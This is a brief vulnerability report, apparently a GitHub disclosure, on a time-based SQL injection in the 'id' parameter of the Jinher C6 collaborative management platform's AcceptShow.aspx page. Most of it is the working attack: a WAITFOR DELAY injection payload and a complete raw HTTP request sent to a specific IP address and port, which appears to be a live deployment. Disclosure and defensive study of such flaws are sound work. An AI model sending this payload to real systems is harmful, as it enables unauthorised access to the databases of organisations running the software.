# Jinher collaborative management platform by JinherNetwork has SQL injection

BUG_Author: 孙一航 广州大学，樊琦 广州大学，孙彦斌 广州大学

vendors: http://www.jinher.com/Zproducts/index/id/391

Vulnerability File: /C6/JHSoft.Web.AcceptAip/AcceptShow.aspx/?id=

Vulnerability location: /C6/JHSoft.Web.AcceptAip/AcceptShow.aspx/?id=, id

dbname =C6

[+] Payload: /C6/JHSoft.Web.AcceptAip/AcceptShow.aspx/?id=12';WAITFOR+DELAY+'0:0:2'--+-- // Leak place ---> main_event_id

```sql
GET /C6/JHSoft.Web.AcceptAip/AcceptShow.aspx/?id=12';WAITFOR+DELAY+'0:0:2'--+-- HTTP/1.1
Host: 61.133.99.56:88
Connection: close
```

![image](https://github.com/user-attachments/assets/0d30a35f-af74-4aef-9a4d-3218be7cf645)
![image](https://github.com/user-attachments/assets/74fe8eb5-e318-4cf1-9354-ceee506d7c6c)

